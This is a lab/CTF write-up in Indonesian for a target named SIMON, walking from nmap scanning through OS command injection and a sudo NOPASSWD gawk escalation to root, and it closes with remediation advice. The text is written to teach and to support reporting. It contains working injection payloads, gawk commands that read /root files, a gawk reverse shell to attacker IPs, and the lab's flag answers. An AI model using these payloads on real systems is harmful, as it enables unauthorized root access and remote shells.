# 06 Write-Up Lab SIMON
## OS Command Injection → RCE `www-data` → User Flag → `sudo` NOPASSWD `gawk` → Root

> **Khusus untuk ujian, laboratorium, CTF, atau pengujian keamanan yang telah memperoleh izin.**
>
> Dokumen ini disusun dari evidence pada capture `SIMON.pdf` dan mengikuti pola penulisan `02_sipadu.md`:
> - **Bagian A** membahas attack path secara detail dari reconnaissance sampai root.
> - **Bagian B** merangkum analisis kerentanan, dampak, dan rekomendasi.
> - **Bagian C** menyediakan close-book cheat sheet untuk eksekusi cepat setelah konsep dipahami.

---

## Cara Menggunakan Dokumen

1. Pelajari **Bagian A** untuk memahami mengapa fitur pemeriksaan layanan berubah menjadi OS command injection.
2. Gunakan **Bagian B** sebagai bahan laporan hasil pengujian keamanan.
3. Gunakan **Bagian C** sebagai panduan cepat ketika praktik atau ujian.
4. Apabila attacker menggunakan WSL 2, periksa ulang IP WSL dan konfigurasi `portproxy` setelah Windows atau WSL di-restart.
5. Jangan menganggap shell root di dalam container otomatis sama dengan root pada host. Verifikasi ruang lingkup kompromi terlebih dahulu.

---

## Ringkasan Data Hafalan

```text
NETWORK                 = 192.168.56.0/24
TARGET                  = 192.168.56.12

PORT_80                 = http://192.168.56.12
PORT_8347               = http://192.168.56.12:8347
INTERNAL_TOOL           = http://192.168.56.12:8347/monitor/

PORT_80_TITLE           = SIMON - Monitoring Layanan | Pusdatin
PORT_8347_TITLE         = SIMON - Perkakas Internal | Pusdatin
WEB_SERVER              = Apache httpd 2.4.67 (Debian)
RUNTIME                 = PHP 8.2.31
APPLICATION_VERSION     = SIMON v1.8

INJECTION_SEPARATOR     = ;
BENIGN_PREFIX           = 8.8.8.8
INITIAL_ACCESS          = www-data
INITIAL_UID             = 33

LOCAL_USER              = monitor
USER_HOME               = /home/monitor
USER_FLAG_PATH          = /home/monitor/flag.txt
USER_FLAG               = FLAG{cmd_1nj3ct_subst_4b1c8f2e}

PRIVESC_ENUM            = sudo -l
SUDO_RULE               = (root) NOPASSWD: /usr/bin/gawk
PRIVESC_BINARY          = /usr/bin/gawk

WINDOWS_HOST_ONLY_IP    = 192.168.56.1
WSL_IP_CAPTURE          = 172.26.59.55
LPORT                   = 12345

ROOT_SCOPE              = root pada container/aplikasi, verifikasi terhadap host
ROOT_FLAG_PATH          = /root/flag.txt
ROOT_FLAG_VALUE         = FLAG{r00t_sud0_gawk_9a7d3c50}
PRIMARY_ROOT_METHOD     = command root langsung melalui web
```

---

## Attack Path Singkat

```text
Host discovery 192.168.56.0/24
→ target 192.168.56.12 ditemukan
→ Nmap menemukan Apache pada port 80 dan 8347
→ port 8347 redirect ke /monitor/
→ fitur "Cek Status Layanan" menerima alamat target
→ input "8.8.8.8; cat /etc/passwd" mengeksekusi command tambahan
→ OS command injection terkonfirmasi
→ id menunjukkan eksekusi sebagai www-data
→ /home/monitor ditemukan
→ user flag dibaca dari /home/monitor/flag.txt
→ sudo -l mengungkap NOPASSWD /usr/bin/gawk
→ gawk dijalankan melalui sudo sebagai root langsung dari form web
→ command `id` membuktikan `uid=0(root)`
→ `find` dijalankan sebagai root melalui gawk
→ `/root/flag.txt` ditemukan
→ root flag dibaca langsung dari halaman web
```

---

# Bagian A — Pembahasan Detail

> Target pembaca: peserta yang ingin memahami alur dari reconnaissance, validasi command injection, pengambilan user flag, sampai privilege escalation menggunakan `sudo gawk`.

---

## 1. Gambaran Besar

Lab SIMON memperlihatkan rantai eksploitasi yang menggabungkan dua kelemahan utama:

1. Fitur pemeriksaan status layanan meneruskan input pengguna ke command sistem operasi tanpa validasi yang aman.
2. Account service web `www-data` diizinkan menjalankan `/usr/bin/gawk` sebagai root melalui `sudo` tanpa password.

Fitur aplikasi seharusnya hanya memeriksa ketersediaan sebuah URL atau host. Namun, input berikut menghasilkan isi `/etc/passwd`:

```text
8.8.8.8; cat /etc/passwd
```

Karakter titik koma (`;`) memisahkan dua command pada shell. Nilai `8.8.8.8` digunakan sebagai input awal yang tampak valid, sedangkan command setelah titik koma dijalankan sebagai command tambahan.

Setelah command execution diperoleh sebagai `www-data`, pemeriksaan `sudo -l` menunjukkan:

```text
(root) NOPASSWD: /usr/bin/gawk
```

Karena `gawk` dapat menjalankan command sistem dan membuka koneksi TCP, rule tersebut dapat disalahgunakan untuk memperoleh command execution sebagai root.

Alur lengkap:

```text
Nmap host discovery
→ identifikasi target 192.168.56.12
→ full TCP scan
→ port 80 dan 8347
→ port 8347 redirect ke /monitor/
→ akses SIMON Perkakas Internal
→ uji input normal
→ uji titik koma dan cat /etc/passwd
→ command injection
→ id = www-data
→ enumerasi /home
→ baca user flag
→ sudo -l
→ NOPASSWD gawk
→ validasi root dengan gawk system("id")
→ root shell langsung atau reverse shell
→ cari root flag
→ baca root flag
```

---

## 2. Data Lab

| Item | Nilai |
|---|---|
| Jaringan lab | `192.168.56.0/24` |
| Target SIMON | `192.168.56.12` |
| Port terbuka | `80/tcp`, `8347/tcp` |
| Web server | `Apache httpd 2.4.67 (Debian)` |
| Runtime aplikasi | `PHP 8.2.31` |
| Aplikasi port 80 | `SIMON - Monitoring Layanan | Pusdatin` |
| Aplikasi port 8347 | `SIMON - Perkakas Internal | Pusdatin` |
| Path internal tool | `/monitor/` |
| Versi aplikasi | `SIMON v1.8` |
| Fitur rentan | `Cek Status Layanan` |
| Jenis kerentanan | OS Command Injection |
| Separator yang berhasil | `;` |
| Account proses web | `www-data`, UID 33 |
| User lokal | `monitor`, UID 1000 |
| User flag | `/home/monitor/flag.txt` |
| Sudo misconfiguration | `NOPASSWD: /usr/bin/gawk` |
| Jalur privilege escalation | `sudo gawk` |
| Scope root | Container/aplikasi; perlu verifikasi terhadap host |
| Root flag | `/root/flag.txt` → `FLAG{r00t_sud0_gawk_9a7d3c50}` |

---

## 3. Fase 1 — Host Discovery

### Tujuan

Menemukan host aktif pada jaringan Host-Only sebelum melakukan port scan penuh.

### Command

```bash
nmap -sn 192.168.56.0/24
```

### Evidence Capture

Capture menunjukkan beberapa host aktif:

```text
192.168.56.1
192.168.56.12
192.168.56.13
192.168.56.14
192.168.56.100
192.168.56.124
```

Target SIMON kemudian diidentifikasi sebagai:

```text
192.168.56.12
```

### Makna Output

Opsi `-sn` hanya melakukan host discovery dan tidak melakukan enumerasi seluruh port. Tahap ini membantu mempersempit host yang perlu diperiksa.

> `192.168.56.1` biasanya merupakan adapter Host-Only pada Windows. Alamat ini juga dapat digunakan sebagai alamat callback dari VM target ketika listener sebenarnya berjalan di WSL 2.

---

## 4. Fase 2 — Full Service Enumeration

### Tujuan

Menentukan seluruh port TCP yang terbuka, service, versi, HTTP title, dan redirect aplikasi.

### Command dari Capture

```bash
nmap -sC -sV -p- 192.168.56.12
```

### Penjelasan Opsi

| Opsi | Fungsi |
|---|---|
| `-sC` | Menjalankan default NSE scripts |
| `-sV` | Mendeteksi service dan versi |
| `-p-` | Memeriksa seluruh port TCP `1-65535` |

### Output Evidence

```text
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.67 ((Debian))
|_http-title: SIMON - Monitoring Layanan | Pusdatin
|_http-server-header: Apache/2.4.67 (Debian)

8347/tcp  open  http    Apache httpd 2.4.67 ((Debian))
|_http-title: SIMON - Perkakas Internal | Pusdatin
|_http-server-header: Apache/2.4.67 (Debian)
|_Requested resource was /monitor/
```

### Makna Output

Dua aplikasi HTTP ditemukan:

```text
Port 80   = aplikasi monitoring utama
Port 8347 = perkakas internal
```

Baris berikut penting:

```text
Requested resource was /monitor/
```

Artinya root path pada port `8347` mengarahkan pengguna ke aplikasi internal pada path:

```text
/monitor/
```

Fokus pengujian berikutnya adalah:

```text
http://192.168.56.12:8347/monitor/
```

---

## 5. Fase 3 — Validasi Redirect dan Teknologi Web

### Command dari Capture

```bash
curl -i http://192.168.56.12:8347
```

### Output Evidence

```text
HTTP/1.1 302 Found
Server: Apache/2.4.67 (Debian)
X-Powered-By: PHP/8.2.31
Location: /monitor/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

### Makna Output

Respons `302 Found` bukan error. Respons tersebut mengonfirmasi bahwa:

- web server aktif;
- aplikasi menggunakan PHP;
- request diarahkan ke `/monitor/`;
- aplikasi internal dapat diakses melalui port `8347`.

### Ikuti Redirect Secara Otomatis

```bash
curl -iL http://192.168.56.12:8347
```

Atau langsung buka:

```text
http://192.168.56.12:8347/monitor/
```

---

## 6. Fase 4 — Memahami Fitur Cek Status Layanan

Pada halaman **SIMON - Perkakas Internal**, terdapat fitur:

```text
Cek Status Layanan
```

Deskripsi pada aplikasi menyatakan bahwa pengguna dapat memasukkan URL atau host untuk memeriksa ketersediaannya melalui pengambilan HTTP header.

Contoh input normal:

```text
https://portal.contoh.go.id
```

Keterangan pada halaman:

```text
Pemeriksaan dijalankan dari sisi server Pusdatin.
```

### Implikasi Keamanan

Fitur ini memiliki dua area risiko:

1. **Server-Side Request Forgery (SSRF)** apabila server dapat diminta mengakses alamat internal.
2. **OS Command Injection** apabila backend membangun command shell dari input pengguna.

Evidence capture membuktikan risiko kedua, karena command seperti `cat`, `id`, `ls`, dan `sudo` berhasil dijalankan.

> Berdasarkan capture, kita dapat menyimpulkan bahwa input mencapai shell. Namun, exact source code atau command backend tidak tersedia, sehingga jangan menebak apakah backend menggunakan `curl`, `wget`, atau command lain.

---

## 7. Fase 5 — Validasi OS Command Injection

### 7.1 Uji Input Normal Terlebih Dahulu

Masukkan host yang valid:

```text
8.8.8.8
```

Tujuan baseline adalah mengetahui bentuk respons normal sebelum menambahkan metacharacter shell.

### 7.2 Uji dengan Command Separator

Masukkan:

```text
8.8.8.8; cat /etc/passwd
```

### Mengapa Payload Ini Bekerja

Pada shell Linux, titik koma memisahkan command:

```bash
command_pertama; command_kedua
```

Secara konseptual, backend rentan dapat berubah menjadi:

```bash
<command_pemeriksaan> 8.8.8.8; cat /etc/passwd
```

Command pemeriksaan pertama dijalankan, kemudian shell menjalankan:

```bash
cat /etc/passwd
```

### Output Evidence

Capture menampilkan isi `/etc/passwd`, termasuk:

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
monitor:x:1000:1000::/home/monitor:/bin/bash
```

### Kesimpulan

Kerentanan telah terkonfirmasi sebagai **OS Command Injection**, bukan hanya error parsing atau SSRF.

Evidence minimum:

```text
Input  : 8.8.8.8; cat /etc/passwd
Output : isi file /etc/passwd
```

---

## 8. Fase 6 — Identifikasi User dan Konteks Eksekusi

Masukkan:

```text
8.8.8.8; id
```

### Output Evidence

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Makna Output

Command dieksekusi menggunakan account service web:

```text
www-data
```

Account ini biasanya memiliki privilege terbatas. Namun, command injection tetap berdampak serius karena attacker dapat:

- membaca file yang dapat diakses `www-data`;
- menjalankan command arbitrer;
- membaca source code dan konfigurasi aplikasi;
- mencari credential;
- mengakses layanan lokal;
- melakukan privilege escalation apabila terdapat salah konfigurasi sistem.

### Validasi Tambahan

```text
8.8.8.8; whoami
```

```text
8.8.8.8; pwd
```

```text
8.8.8.8; hostname
```

Output `sudo -l` pada capture menampilkan hostname seperti:

```text
4f568867824c
```

Format tersebut menyerupai container ID, sehingga terdapat indikasi kuat bahwa aplikasi berjalan di dalam container.

---

## 9. Fase 7 — Enumerasi User Lokal

Dari `/etc/passwd`, ditemukan account:

```text
monitor:x:1000:1000::/home/monitor:/bin/bash
```

Informasi tersebut mengungkapkan:

```text
Username = monitor
UID      = 1000
Home     = /home/monitor
Shell    = /bin/bash
```

### Periksa Isi Home Directory

Masukkan:

```text
8.8.8.8; ls -la /home/monitor
```

### Output Evidence

```text
flag.txt
```

### Makna Output

User flag berada pada:

```text
/home/monitor/flag.txt
```

---

## 10. Fase 8 — Membaca User Flag

Masukkan:

```text
8.8.8.8; cat /home/monitor/flag.txt
```

### Output Evidence

```text
FLAG{cmd_1nj3ct_subst_4b1c8f2e}
```

### Makna Flag

User flag membuktikan bahwa attacker telah memperoleh kemampuan command execution yang cukup untuk membaca data milik user lokal.

```text
USER FLAG = FLAG{cmd_1nj3ct_subst_4b1c8f2e}
```

> Capture tambahan membuktikan bahwa root flag berada di `/root/flag.txt` dan dapat dibaca langsung melalui fitur web setelah `gawk` dijalankan dengan `sudo`.

---

## 11. Fase 9 — Enumerasi Privilege Escalation

Setelah memperoleh initial command execution sebagai `www-data`, lakukan pemeriksaan privilege lokal.

### Command Utama

Masukkan:

```text
8.8.8.8; sudo -l
```

### Output Evidence

```text
Matching Defaults entries for www-data on 4f568867824c:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    use_pty

User www-data may run the following commands on 4f568867824c:
    (root) NOPASSWD: /usr/bin/gawk
```

### Analisis

Rule berikut adalah jalur privilege escalation:

```text
(root) NOPASSWD: /usr/bin/gawk
```

Artinya:

- user `www-data` dapat menjalankan `/usr/bin/gawk`;
- command dijalankan sebagai `root`;
- tidak diperlukan password;
- `gawk` memiliki kemampuan menjalankan command sistem dan membuat koneksi jaringan.

### Validasi Binary

```text
8.8.8.8; ls -l /usr/bin/gawk
```

```text
8.8.8.8; /usr/bin/gawk --version | head -n 1
```

### Catatan Penting

Privilege escalation terjadi karena **sudo rule**, bukan karena bit SUID pada `gawk`.

---

## 12. Fase 10 — Memahami Penyalahgunaan `gawk`

`gawk` adalah implementasi GNU AWK. Selain memproses teks, `gawk` mendukung:

- fungsi `system()` untuk menjalankan command;
- coprocess melalui operator `|&`;
- special file TCP seperti `/inet/tcp/...`.

Karena binary tersebut dapat dijalankan melalui `sudo`, seluruh fungsi itu dijalankan dengan privilege root.

Terdapat dua jalur yang dapat digunakan:

```text
Opsi A = menjalankan command root langsung melalui system()
Opsi B = membuka reverse shell root melalui fitur TCP gawk
```

Opsi A lebih sederhana dan stabil. Opsi B mengikuti capture dan memberikan sesi shell terpisah pada attacker.

---

## 13. Fase 11A — Privilege Escalation dan Pengambilan Flag Langsung melalui Web

Metode ini menjadi **jalur utama** pada lab SIMON. Seluruh proses dilakukan melalui kolom **Alamat Target**, sehingga tidak membutuhkan listener, reverse shell, konfigurasi WSL `portproxy`, atau stabilisasi terminal.

### 13.1 Validasi Eksekusi sebagai Root

Masukkan:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("id")}'
```

### Output Evidence Aktual

```text
uid=0(root) gid=0(root) groups=0(root)
```

Output `uid=0(root)` membuktikan bahwa fungsi `system()` pada `gawk` dieksekusi dengan privilege root.

---

### 13.2 Menemukan Lokasi Flag melalui Web

Masukkan:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("find / -type f -name flag.txt 2>/dev/null")}'
```

### Output Evidence Aktual

```text
/home/monitor/flag.txt
/root/flag.txt
```

| Jenis | Lokasi |
|---|---|
| User flag | `/home/monitor/flag.txt` |
| Root flag | `/root/flag.txt` |

---

### 13.3 Membaca Kedua Flag Langsung melalui Web

Masukkan:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /home/monitor/flag.txt")}'; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}';
```

### Output Evidence Aktual

```text
FLAG{cmd_1nj3ct_subst_4b1c8f2e}
FLAG{r00t_sud0_gawk_9a7d3c50}
```

### Hasil Final

```text
USER FLAG = FLAG{cmd_1nj3ct_subst_4b1c8f2e}
ROOT FLAG = FLAG{r00t_sud0_gawk_9a7d3c50}
```

Alternatif membaca root flag saja:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}'
```

Expected:

```text
FLAG{r00t_sud0_gawk_9a7d3c50}
```

### Keunggulan Metode Web Langsung

- tidak membutuhkan listener Netcat;
- tidak bergantung pada routing WSL;
- tidak memerlukan Windows `portproxy`;
- lebih cepat dan stabil untuk ujian;
- seluruh evidence tampil pada halaman aplikasi;
- sudah cukup untuk membuktikan root command execution dan memperoleh root flag.

> Reverse shell tetap dapat digunakan untuk eksplorasi interaktif, tetapi tidak diperlukan untuk menyelesaikan lab.

---

## 14. Fase 11B — Alternatif Opsional: Root Reverse Shell Menggunakan `gawk`

Opsi ini hanya diperlukan apabila ingin memperoleh shell interaktif. Untuk mendapatkan flag, metode web langsung pada Fase 11A sudah cukup dan lebih stabil.

### 14.1 Siapkan Listener

Pada attacker Linux atau WSL:

```bash
nc -lvnp 12345
```

Capture menuliskan bentuk berikut, yang juga valid pada banyak implementasi Netcat:

```bash
nc -nlvp 12345
```

Output yang diharapkan:

```text
listening on [any] 12345 ...
```

### 14.2 Payload `gawk` dari Capture

Struktur payload:

```bash
sudo /usr/bin/gawk 'BEGIN {
    s = "/inet/tcp/0/ATTACKER_IP/12345";
    while (1) {
        printf "> " |& s;
        if ((s |& getline c) <= 0) break;
        while (c && (c |& getline) > 0) print $0 |& s;
        close(c)
    }
}'
```

Versi satu baris:

```bash
sudo /usr/bin/gawk 'BEGIN {s="/inet/tcp/0/ATTACKER_IP/12345";while(1){printf "> " |& s;if((s |& getline c)<=0)break;while(c&&(c |& getline)>0)print $0 |& s;close(c)}}'
```

### 14.3 Payload untuk Attacker yang Berada di Jaringan Host-Only

Apabila attacker merupakan VM Kali dengan IP langsung, ganti `ATTACKER_IP` dengan IP interface Kali:

```bash
ip -br addr
```

Contoh:

```text
192.168.56.11
```

Payload:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {s="/inet/tcp/0/192.168.56.11/12345";while(1){printf "> " |& s;if((s |& getline c)<=0)break;while(c&&(c |& getline)>0)print $0 |& s;close(c)}}'
```

### 14.4 Payload untuk Attacker WSL 2

Target VM biasanya tidak dapat menjangkau IP NAT internal WSL secara langsung.

Dari capture lingkungan sebelumnya:

```text
Windows Host-Only = 192.168.56.1
WSL internal      = 172.26.59.55
```

Payload pada target harus menggunakan IP Windows yang dapat dijangkau VM:

```text
192.168.56.1
```

Bukan:

```text
172.26.59.55
```

Payload:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {s="/inet/tcp/0/192.168.56.1/12345";while(1){printf "> " |& s;if((s |& getline c)<=0)break;while(c&&(c |& getline)>0)print $0 |& s;close(c)}}'
```

Windows kemudian meneruskan port tersebut ke listener WSL.

---

## 15. Fase 12 — Menyiapkan Callback WSL 2

Lewati bagian ini apabila attacker menggunakan Kali VM dengan interface langsung pada `192.168.56.0/24`.

### 15.1 Cari IP WSL

Di WSL:

```bash
ip -br addr
```

Contoh capture:

```text
eth0 UP 172.26.59.55/20
```

Atau dari PowerShell:

```powershell
wsl hostname -I
```

### 15.2 Cari IP Windows Host-Only

Buka PowerShell:

```powershell
Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.IPAddress -like "192.168.56.*" }
```

Expected pada lab:

```text
192.168.56.1
```

### 15.3 Buka PowerShell sebagai Administrator

```powershell
Start-Process powershell -Verb RunAs
```

Klik **Yes** pada dialog UAC.

### 15.4 Buat Port Forwarding

Pada PowerShell Administrator:

```powershell
netsh interface portproxy add v4tov4 `
  listenaddress=0.0.0.0 `
  listenport=12345 `
  connectaddress=172.26.59.55 `
  connectport=12345
```

Batasi rule firewall ke jaringan lab:

```powershell
New-NetFirewallRule `
  -DisplayName "SIMON WSL Listener 12345" `
  -Direction Inbound `
  -Action Allow `
  -Protocol TCP `
  -LocalPort 12345 `
  -RemoteAddress 192.168.56.0/24
```

### 15.5 Verifikasi Portproxy

```powershell
netsh interface portproxy show v4tov4
```

Expected:

```text
0.0.0.0  12345  172.26.59.55  12345
```

### 15.6 Diagram Callback

```text
SIMON container/VM
192.168.56.12
      |
      | TCP 12345
      v
Windows Host-Only
192.168.56.1:12345
      |
      | netsh portproxy
      v
WSL 2
172.26.59.55:12345
      |
      v
nc -lvnp 12345
```

### 15.7 IP WSL Berubah

Setelah `wsl --shutdown` atau restart, IP WSL dapat berubah. Hapus rule lama:

```powershell
netsh interface portproxy delete v4tov4 `
  listenaddress=0.0.0.0 `
  listenport=12345
```

Kemudian buat ulang menggunakan IP WSL terbaru.

---

## 16. Fase 13 — Validasi Root Shell

Setelah payload reverse shell dikirim, listener seharusnya menerima koneksi.

### Command Validasi

```bash
id
whoami
hostname
pwd
```

### Expected

```text
uid=0(root) gid=0(root) groups=0(root)
root
4f568867824c
/
```

Hostname dapat berbeda. Pada capture `sudo -l`, hostname yang terlihat adalah:

```text
4f568867824c
```

### Jika Shell Tidak Interaktif

Shell `gawk` pada capture merupakan command channel dan bukan TTY penuh. Command dasar tetap dapat dijalankan:

```bash
id
whoami
find / -type f -name "flag.txt" 2>/dev/null
```

Untuk stabilitas ujian, Opsi A menggunakan `system()` sering lebih mudah daripada reverse shell.

---

## 17. Fase 14 — Root Flag Diperoleh Langsung dari Web

Setelah `sudo gawk` terbukti menjalankan command sebagai root, pencarian dan pembacaan flag dilakukan sepenuhnya melalui form web.

### 17.1 Cari Lokasi Flag

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("find / -type f -name flag.txt 2>/dev/null")}'
```

Output aktual:

```text
/home/monitor/flag.txt
/root/flag.txt
```

### 17.2 Baca Root Flag

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}'
```

Output aktual:

```text
FLAG{r00t_sud0_gawk_9a7d3c50}
```

### 17.3 Baca User Flag dan Root Flag dalam Satu Request

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /home/monitor/flag.txt")}'; sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}';
```

Output aktual:

```text
FLAG{cmd_1nj3ct_subst_4b1c8f2e}
FLAG{r00t_sud0_gawk_9a7d3c50}
```

Rantai akhir dapat diringkas menjadi:

```text
command injection
→ sudo gawk
→ uid=0(root)
→ find /root/flag.txt
→ cat /root/flag.txt
→ root flag
```

---

## 18. Memahami Scope Root: Container atau Host

Output `sudo -l` menyebut hostname:

```text
4f568867824c
```

Nama tersebut menyerupai ID container Docker. Oleh karena itu, shell root yang diperoleh kemungkinan adalah:

```text
root di dalam container aplikasi
```

Bukan otomatis:

```text
root pada host Windows, hypervisor, atau host Docker
```

### Verifikasi Container

```bash
test -f /.dockerenv && echo "[+] Docker container terdeteksi"
cat /proc/1/cgroup
hostname
ps -p 1 -f
mount | head -n 30
```

### Periksa Risiko terhadap Host

Hanya lakukan pada lab yang berwenang:

```bash
ls -l /var/run/docker.sock 2>/dev/null
mount | grep -E '/host|docker|container'
capsh --print 2>/dev/null
```

Hal yang meningkatkan risiko container escape:

- container berjalan dengan `--privileged`;
- Docker socket di-mount;
- filesystem host di-mount writable;
- capability berbahaya seperti `CAP_SYS_ADMIN`;
- kernel host rentan.

Tanpa evidence tersebut, laporan harus menyatakan **root pada container**, bukan full host compromise.

---

## 19. Validasi Akhir

Checklist keberhasilan:

```text
[ ] Target 192.168.56.12 aktif
[ ] Port 80 dan 8347 terbuka
[ ] Port 8347 redirect ke /monitor/
[ ] Header menunjukkan Apache 2.4.67 dan PHP 8.2.31
[ ] Input 8.8.8.8; cat /etc/passwd menampilkan file
[ ] id menunjukkan www-data UID 33
[ ] /home/monitor/flag.txt ditemukan
[ ] User flag terbaca
[ ] sudo -l menunjukkan NOPASSWD /usr/bin/gawk
[ ] gawk dapat menjalankan id sebagai root
[ ] Root command execution melalui web terkonfirmasi dengan `uid=0(root)`
[ ] `find` melalui `sudo gawk` menemukan `/root/flag.txt`
[ ] Root flag terbaca langsung dari halaman web
[ ] Root flag = `FLAG{r00t_sud0_gawk_9a7d3c50}`
[ ] Scope container/host telah diverifikasi
```

---

## 20. Troubleshooting Lengkap

### 20.1 Port `8347` Tidak Menampilkan Aplikasi

Periksa service:

```bash
nmap -sV -p80,8347 192.168.56.12
```

Periksa redirect:

```bash
curl -i http://192.168.56.12:8347
```

Akses langsung:

```text
http://192.168.56.12:8347/monitor/
```

---

### 20.2 Payload `cat /etc/passwd` Tidak Menghasilkan Output

Pastikan format input:

```text
8.8.8.8; cat /etc/passwd
```

Periksa:

- terdapat titik koma setelah `8.8.8.8`;
- tidak ada karakter kutip tambahan;
- input dikirim melalui fitur **Cek Status Layanan**;
- halaman yang digunakan adalah `/monitor/`;
- respons tidak terpotong oleh browser.

Uji command singkat:

```text
8.8.8.8; id
```

---

### 20.3 Output Hanya Menampilkan Hasil Pemeriksaan Awal

Coba command yang menghasilkan output pendek:

```text
8.8.8.8; whoami
```

```text
8.8.8.8; echo SIMON-CMD-INJECTION
```

Apabila marker tampil, command injection berhasil meskipun output command pertama masih ikut muncul.

---

### 20.4 `sudo -l` Meminta Password

Capture lab menunjukkan:

```text
(root) NOPASSWD: /usr/bin/gawk
```

Apabila environment berbeda dan meminta password:

- pastikan command berjalan sebagai `www-data`;
- pastikan path yang dipanggil adalah `/usr/bin/gawk`;
- periksa output lengkap `sudo -l`;
- jangan menganggap rule sama pada target lain.

---

### 20.5 `sudo gawk` Ditolak

Gunakan path penuh:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("id")}'
```

Bukan binary lain seperti:

```text
awk
mawk
/usr/bin/awk
```

Rule sudo dapat membatasi command berdasarkan path exact.

---

### 20.6 Reverse Shell Tidak Masuk

Periksa listener:

```bash
sudo ss -lntp | grep ':12345'
```

Pastikan tidak ada proses lama:

```bash
sudo fuser -k 12345/tcp
```

Buka ulang:

```bash
nc -lvnp 12345
```

Untuk WSL, payload harus menggunakan:

```text
192.168.56.1
```

sedangkan `portproxy` meneruskan ke IP WSL, misalnya:

```text
172.26.59.55
```

Pantau koneksi:

```bash
sudo tcpdump -ni any 'host 192.168.56.12 and tcp port 12345'
```

---

### 20.7 PowerShell Menampilkan `Requires Elevation`

Error:

```text
The requested operation requires elevation
Access is denied
```

Buka PowerShell Administrator:

```powershell
Start-Process powershell -Verb RunAs
```

Jalankan kembali `portproxy` dan firewall rule pada jendela baru.

---

### 20.8 Port Listener Sudah Digunakan

Error umum:

```text
Address already in use
```

Cari proses:

```bash
sudo ss -lntp | grep ':12345'
sudo lsof -nP -iTCP:12345 -sTCP:LISTEN
```

Hentikan:

```bash
sudo fuser -k 12345/tcp
```

---

### 20.9 Direct Root Command Lebih Stabil daripada Reverse Shell

Apabila reverse shell bermasalah, gunakan command root langsung:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("id")}'
```

Cari flag:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("find / -type f -name flag.txt 2>/dev/null")}'
```

Baca path hasil pencarian:

```text
8.8.8.8; sudo /usr/bin/gawk 'BEGIN {system("cat /PATH/HASIL/FIND")}'
```

---

### 20.10 Root Flag Tidak Ditemukan

Gunakan beberapa pola:

```bash
find / -type f -name "flag.txt" 2>/dev/null
find / -type f -iname "*flag*" 2>/dev/null
find /root /home /opt /var/www -type f 2>/dev/null | grep -i flag
```

Periksa apakah shell benar-benar root:

```bash
id
whoami
```

---

## 21. Alur Hafalan SIMON

```text
nmap -sn 192.168.56.0/24
→ target 192.168.56.12
→ nmap -sC -sV -p- 192.168.56.12
→ port 80 dan 8347
→ curl -i :8347
→ 302 /monitor/
→ buka :8347/monitor/
→ 8.8.8.8; cat /etc/passwd
→ command injection
→ 8.8.8.8; id
→ www-data
→ ls /home/monitor
→ cat /home/monitor/flag.txt
→ FLAG{cmd_1nj3ct_subst_4b1c8f2e}
→ sudo -l
→ NOPASSWD /usr/bin/gawk
→ sudo gawk system("id")
→ uid=0(root)
→ direct root command atau gawk reverse shell
→ find / -type f -name flag.txt
→ cat root flag
```

---

# Bagian B — Analisis Temuan dan Rekomendasi

## 1. Rantai Kerentanan

```text
Fitur pemeriksaan layanan menerima input pengguna
→ input digabungkan ke command shell
→ titik koma memisahkan command
→ attacker menjalankan command arbitrer sebagai www-data
→ attacker membaca file lokal dan user flag
→ sudoers mengizinkan www-data menjalankan gawk sebagai root
→ gawk menjalankan system() atau membuat TCP connection
→ root command execution dalam container
→ root flag dapat dibaca
```

Eksploitasi penuh terjadi karena kombinasi:

- validasi input yang tidak aman;
- penggunaan shell untuk fungsi yang seharusnya dapat dilakukan melalui library HTTP;
- excessive privilege pada account service web;
- sudo rule terhadap binary yang memiliki kemampuan menjalankan command.

---

## 2. Temuan 1 — OS Command Injection pada Fitur Cek Status Layanan

### Deskripsi

Fitur **Cek Status Layanan** menerima alamat host atau URL. Input pengguna dapat menyertakan shell metacharacter titik koma dan command tambahan.

Payload:

```text
8.8.8.8; cat /etc/passwd
```

menghasilkan isi `/etc/passwd`.

### Evidence Utama

```text
8.8.8.8; cat /etc/passwd
→ root:x:0:0:...
→ www-data:x:33:33:...
→ monitor:x:1000:1000:...
```

```text
8.8.8.8; id
→ uid=33(www-data) gid=33(www-data)
```

### Dampak

Attacker dapat:

- menjalankan command arbitrer;
- membaca source code dan file konfigurasi;
- memperoleh password, token, dan database credential;
- mengakses file user lokal;
- melakukan lateral movement;
- mengganggu availability aplikasi;
- melakukan privilege escalation;
- mengambil alih container aplikasi sebagai root.

### Severity

Secara keseluruhan, temuan ini berpotensi **Critical**, terutama apabila fitur dapat diakses tanpa autentikasi atau oleh banyak pengguna internal.

### Rekomendasi Utama

Jangan menjalankan utility command-line menggunakan input pengguna.

Gunakan library HTTP pada level aplikasi, misalnya:

- PHP cURL extension;
- Guzzle;
- library HTTP lain yang tidak memerlukan shell.

Validasi URL secara ketat:

- izinkan hanya skema `http` dan `https`;
- parse URL menggunakan fungsi resmi;
- gunakan allowlist domain apabila memungkinkan;
- tolak username/password pada URL;
- tolak shell metacharacter;
- tolak newline dan control character;
- batasi port tujuan;
- lakukan DNS resolution dan validasi seluruh hasil IP;
- blok loopback, link-local, private network, dan metadata endpoint jika tidak diperlukan.

